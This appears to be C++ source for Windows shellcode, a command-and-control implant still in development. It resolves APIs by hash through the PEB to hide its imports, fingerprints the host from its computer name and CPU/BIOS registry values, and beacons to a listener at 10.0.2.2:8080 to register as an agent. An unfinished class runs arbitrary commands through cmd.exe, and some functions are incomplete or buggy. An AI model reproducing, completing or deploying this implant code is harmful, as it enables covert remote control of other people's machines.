#include <common.h>
#include <constexpr.h>
#include <cstddef>
#include <resolve.h>
#include "winhttp.h"

#include "config/env.h"

using namespace bloodfang;

extern "C" auto declfn entry(_In_ void *args) -> void {
  bloodfang::instance().start(args);
}

#include <cstdint>

size_t strlen(const char* str) {
    size_t length = 0;
    while (*str != '\0') {
        length++;
        str++;
    }
    return length;
}

class Term {
public:
    Term(uintptr_t ntdll_handle, uintptr_t kernel32_handle, uintptr_t user32_handle);
    char* run(char* command);
private:
    uintptr_t ntdll_handle, kernel32_handle, user32_handle;
};

Term::Term(uintptr_t ntdll_handle, uintptr_t kernel32_handle, uintptr_t user32_handle) {
    this->ntdll_handle = ntdll_handle;
    this->kernel32_handle = kernel32_handle;
    this->user32_handle = user32_handle;
}

char* Term::run(char* command) {
    decltype(WaitForSingleObject) *wait_for_single_object = RESOLVE_API(this->kernel32_handle, WaitForSingleObject);
    decltype(CreatePipe) *create_pipe = RESOLVE_API(this->kernel32_handle, CreatePipe);
    decltype(GetStdHandle) *get_std_handle = RESOLVE_API(this->kernel32_handle, GetStdHandle);
    decltype(GetProcessHeap) *get_process_heap = RESOLVE_API(this->kernel32_handle, GetProcessHeap);
    decltype(CreateProcess) *create_process = RESOLVE_API(this->kernel32_handle, CreateProcess);
    decltype(CloseHandle) *close_handle = RESOLVE_API(this->kernel32_handle, CloseHandle);
    decltype(RtlAllocateHeap) *rtl_alloc_heap = RESOLVE_API(this->ntdll_handle, RtlAllocateHeap);
    decltype(wsprintfA) *_wsprintf = RESOLVE_API(this->user32_handle, wsprintfA);

    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE read, write;
    if (!create_pipe(&read, &write, &sa, 0)) {
        return NULL;
    }

    STARTUPINFO si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = get_std_handle(STD_INPUT_HANDLE);
    si.hStdOutput = write;
    si.hStdError = write;

    PROCESS_INFORMATION pi = {0};

    HANDLE heap = get_process_heap();
    if (heap == NULL) {
        return NULL;
    }

    char* command_prefix = "cmd.exe /c ";

    char* command_buffer = (char*)rtl_alloc_heap(heap, 0, strlen(command_prefix) + strlen(command) + 1);

    int chars_written_command_buffer = _wsprintf(command_buffer, "%s%s", command_prefix, command);

    if (!create_process(NULL, const_cast<char*>(command_buffer), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        close_handle(read);
        close_handle(write);
        return NULL;
    }

    close_handle(write);

    wait_for_single_object(pi.hProcess, INFINITE);

    close_handle(pi.hProcess);
    close_handle(pi.hThread);

    // TODO: Getting late, tomorrow's problem...
}

class Machine {
public:
    uint32_t id;
    char name[16];
    char cpu_name[256];
    char identifier[256];
    char bios[256];
    Machine(uintptr_t ntdll_handle, uintptr_t kernel32_handle, uintptr_t user32_handle);
    char* get_id(void);

private:
    uintptr_t ntdll_handle, kernel32_handle, user32_handle;
    void resolve_name(void);
    void resolve_cpu_name(void);
    void resolve_identifier(void);
    void resolve_bios(void);
    uint32_t fnv1a_hash(const char* str) const;
    const uint32_t FNV_prime = 16777619u;
    const uint32_t FNV_offset_basis = 2166136261u;
    void compute_id(void);
};

Machine::Machine(uintptr_t ntdll_handle, uintptr_t kernel32_handle, uintptr_t user32_handle) {
    this->kernel32_handle = kernel32_handle;
    this->ntdll_handle = ntdll_handle;
    this->user32_handle = user32_handle;
    this->resolve_name();
    this->resolve_cpu_name();
    this->resolve_identifier();
    this->resolve_bios();
    this->compute_id();
}

char* Machine::get_id(void) {
    decltype(wsprintfA) *_wsprintf = RESOLVE_API(this->user32_handle, wsprintfA);
    decltype(GetProcessHeap) *get_process_heap = RESOLVE_API(this->kernel32_handle, GetProcessHeap);
    decltype(RtlAllocateHeap) *rtl_alloc_heap = RESOLVE_API(this->ntdll_handle, RtlAllocateHeap);
    if (_wsprintf == NULL || get_process_heap == NULL || rtl_alloc_heap == NULL) {
        return NULL;
    }
    HANDLE heap = get_process_heap();
    if (heap == NULL) {
        return NULL;
    }
    char* buffer = (char*)rtl_alloc_heap(heap, 0, 12);
    if (buffer == NULL) {
        return NULL;
    }
    _wsprintf(buffer, "%u", this->id);
    return buffer;
}

void Machine::compute_id(void) {
    uint32_t hash_name = fnv1a_hash(name);
    uint32_t hash_cpu_name = fnv1a_hash(cpu_name);
    uint32_t hash_identifier = fnv1a_hash(identifier);
    uint32_t hash_bios = fnv1a_hash(bios);
    this->id = hash_name ^ hash_cpu_name ^ hash_identifier ^ hash_bios;
}

uint32_t Machine::fnv1a_hash(const char* str) const {
    uint32_t hash = FNV_offset_basis;
    while (*str) {
        hash ^= static_cast<uint32_t>(static_cast<unsigned char>(*str++));
        hash *= FNV_prime;
    }
    return hash;
}

void Machine::resolve_bios(void) {
    decltype(RegGetValueA) *reg_get_value = RESOLVE_API(this->kernel32_handle, RegGetValueA);
	decltype(GetProcessHeap) *get_process_heap = RESOLVE_API(this->kernel32_handle, GetProcessHeap);
    DWORD type = 0;
    DWORD pcb_data = sizeof(this->cpu_name);
    LSTATUS result = reg_get_value(
        HKEY_LOCAL_MACHINE,
        "HARDWARE\\DESCRIPTION\\System",
        "SystemBiosVersion",
        RRF_RT_REG_SZ,
        &type,
        this->bios,
        &pcb_data
    );
}

void Machine::resolve_identifier(void) {
    decltype(RegGetValueA) *reg_get_value = RESOLVE_API(this->kernel32_handle, RegGetValueA);
	decltype(GetProcessHeap) *get_process_heap = RESOLVE_API(this->kernel32_handle, GetProcessHeap);
    DWORD type = 0;
    DWORD pcb_data = sizeof(this->cpu_name);
    LSTATUS result = reg_get_value(
        HKEY_LOCAL_MACHINE,
        "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
        "Identifier",
        RRF_RT_REG_SZ,
        &type,
        this->identifier,
        &pcb_data
    );
}

void Machine::resolve_cpu_name(void) {
    decltype(RegGetValueA) *reg_get_value = RESOLVE_API(this->kernel32_handle, RegGetValueA);
	decltype(GetProcessHeap) *get_process_heap = RESOLVE_API(this->kernel32_handle, GetProcessHeap);
    DWORD type = 0;
    DWORD pcb_data = sizeof(this->cpu_name);
    LSTATUS result = reg_get_value(
        HKEY_LOCAL_MACHINE,
        "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
        "ProcessorNameString",
        RRF_RT_REG_SZ,
        &type,
        this->cpu_name,
        &pcb_data
    );
}

void Machine::resolve_name(void) {
    decltype(GetComputerNameA) *get_computer_name = RESOLVE_API(this->kernel32_handle, GetComputerNameA);
    unsigned long pc_name_size = sizeof(this->name) / sizeof(this->name[0]);
    get_computer_name(this->name, &pc_name_size);
}

class Net {
public:
    Net(uintptr_t ntdll_handle, uintptr_t kernel32_handle, uintptr_t user32_handle, uintptr_t winhttp_handle, const wchar_t* host, uint32_t port);
    char* announce(char name[16]);

private:
    uintptr_t ntdll_handle, kernel32_handle, user32_handle, winhttp_handle;
    const wchar_t* host;
    uint32_t port;
};

Net::Net(uintptr_t ntdll_handle, uintptr_t kernel32_handle, uintptr_t user32_handle, uintptr_t winhttp_handle, const wchar_t* host, uint32_t port) {
    this->ntdll_handle = ntdll_handle;
    this->kernel32_handle = kernel32_handle;
    this->user32_handle = user32_handle;
    this->winhttp_handle = winhttp_handle;
    this->host = host;
    this->port = port;
}

char* Net::announce(char name[16]) {
	decltype(GetProcessHeap) *get_process_heap = RESOLVE_API(this->kernel32_handle, GetProcessHeap);
	decltype(RtlAllocateHeap) *rtl_alloc_heap = RESOLVE_API(this->ntdll_handle, RtlAllocateHeap);

	decltype(wsprintfA) *_wsprintf = RESOLVE_API(this->user32_handle, wsprintfA);
    
    decltype(WinHttpOpen) *win_http_open = RESOLVE_API(this->winhttp_handle, WinHttpOpen);
	decltype(WinHttpConnect) *win_http_connect = RESOLVE_API(this->winhttp_handle, WinHttpConnect);
	decltype(WinHttpOpenRequest) *win_http_open_request = RESOLVE_API(this->winhttp_handle, WinHttpOpenRequest);
	decltype(WinHttpAddRequestHeaders) *win_http_add_request_headers = RESOLVE_API(this->winhttp_handle, WinHttpAddRequestHeaders);
	decltype(WinHttpSendRequest) *win_http_send_request = RESOLVE_API(this->winhttp_handle, WinHttpSendRequest);
	decltype(WinHttpReceiveResponse) *win_http_receive_response = RESOLVE_API(this->winhttp_handle, WinHttpReceiveResponse);
	decltype(WinHttpQueryDataAvailable) *win_http_query_data_available = RESOLVE_API(this->winhttp_handle, WinHttpQueryDataAvailable);
	decltype(WinHttpReadData) *win_http_read_data = RESOLVE_API(this->winhttp_handle, WinHttpReadData);
	decltype(WinHttpCloseHandle) *win_http_close_handle = RESOLVE_API(this->winhttp_handle, WinHttpCloseHandle);

    char req_data[32];
    // int chars_written_req_data = _wsprintf(req_data, "{\"name\":\"%s\"}", name);
    int chars_written_req_data = _wsprintf(req_data, "%s", name);
    if (chars_written_req_data <= 0) {
        return "1";
    }

    HINTERNET session = win_http_open(
        L"",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );
    if (!session) {
        return "2";
    }

    HINTERNET conn = win_http_connect(session, this->host, this->port, 0);
    if (!conn) {
        return "3";
    }

    HINTERNET req = win_http_open_request(conn, L"PUT", L"/v1/agents", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!req) {
        return "4";
    }

    const wchar_t* headers = L"Content-Type: application/json";

    if (!win_http_add_request_headers(req, headers, -1, WINHTTP_ADDREQ_FLAG_ADD)) {
        return "5";
    }

    if (!win_http_send_request(req, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)req_data, chars_written_req_data, chars_written_req_data, NULL)) {
        return "6";
    }

    if (!win_http_receive_response(req, NULL)) {
        return "win_http_receive_response";
    }

    DWORD resp_size = 0;
    if (!win_http_query_data_available(req, &resp_size)) {
        return "7";
    }

    if (resp_size == 0) {
        return "8";
    }

    // char* resp_data = new char[resp_size + 1];
    HANDLE heap = get_process_heap();
    if (!heap) {
        return "get_process_heap";
    }

    if (!rtl_alloc_heap) {
        return "rtl_alloc_heap bad";
    }

    char* resp_data = (char*)rtl_alloc_heap(heap, HEAP_ZERO_MEMORY, resp_size + 1);
    if (!resp_data) {
        return "heap_alloc_err";
    }
    DWORD bytes_read = 0;

    if (!win_http_read_data(req, resp_data, resp_size, &bytes_read)) {
        return "9";
    }

    resp_data[bytes_read] = '\0';

    // delete[] resp_data;
    win_http_close_handle(req);
    win_http_close_handle(conn);
    win_http_close_handle(session);
    return resp_data;
}

declfn instance::instance(void) {
	// Calculate the shellcode base address + size.
	base.address = RipStart();
	base.length = (RipData() - base.address) + END_OFFSET;

	// Load the modules from PEB or any other desired way.

	if (!(ntdll.handle = resolve::module(expr::hash_string<wchar_t>(L"ntdll.dll")))) {
		return;
	}

	if (!(kernel32.handle = resolve::module(expr::hash_string<wchar_t>(L"kernel32.dll")))) {
		return;
	}

	// Let the macro handle the resolving part automatically.

	RESOLVE_IMPORT(ntdll);
	RESOLVE_IMPORT(kernel32);
}

auto declfn instance::start(_In_ void *arg) -> void {
	const auto user32 = kernel32.LoadLibraryA(symbol<const char *>("user32.dll"));
	const auto winhttp = kernel32.LoadLibraryA(symbol<const char *>("winhttp.dll"));

	if (user32) {
		DBG_PRINTF("oh wow look we loaded user32.dll -> %p\n", user32);
	} else {
		DBG_PRINTF("okay something went wrong. failed to load user32 :/\n");
	}

    if (winhttp) {
		DBG_PRINTF("oh wow look we loaded winhttp.dll -> %p\n", winhttp);
	} else {
		DBG_PRINTF("okay something went wrong. failed to load winhttp :/\n");
	}

	DBG_PRINTF(
		"running from %ls (Pid: %d)\n",
		NtCurrentPeb()->ProcessParameters->ImagePathName.Buffer,
		NtCurrentTeb()->ClientId.UniqueProcess
	);

	DBG_PRINTF(
		"shellcode @ %p [%d bytes]\n",
		base.address,
		base.length
	);

	decltype(MessageBoxA) *msgbox = RESOLVE_API(reinterpret_cast<uintptr_t>(user32), MessageBoxA);

	decltype(Sleep) *sleep = RESOLVE_API(reinterpret_cast<uintptr_t>(kernel32.handle), Sleep);

	Machine machine(
        reinterpret_cast<uintptr_t>(ntdll.handle),
        reinterpret_cast<uintptr_t>(kernel32.handle),
        reinterpret_cast<uintptr_t>(user32)
    );
	msgbox(nullptr, machine.get_id(), symbol<const char *>("caption"), MB_OK);

    Net net(
        reinterpret_cast<uintptr_t>(ntdll.handle),
        reinterpret_cast<uintptr_t>(kernel32.handle),
        reinterpret_cast<uintptr_t>(user32),
        reinterpret_cast<uintptr_t>(winhttp),
        L"10.0.2.2",
        8080
    );
    
    auto announce_result = net.announce(machine.name);
	msgbox(nullptr, announce_result, symbol<const char *>("caption"), MB_OK);
	DBG_PRINTF("announce result: %d", announce_result);

	while (1) {
		msgbox(nullptr, symbol<const char *>("Hello world"), symbol<const char *>("caption"), MB_OK);

		sleep(MAIN_LOOP_SLEEP_MILI);
	}
}
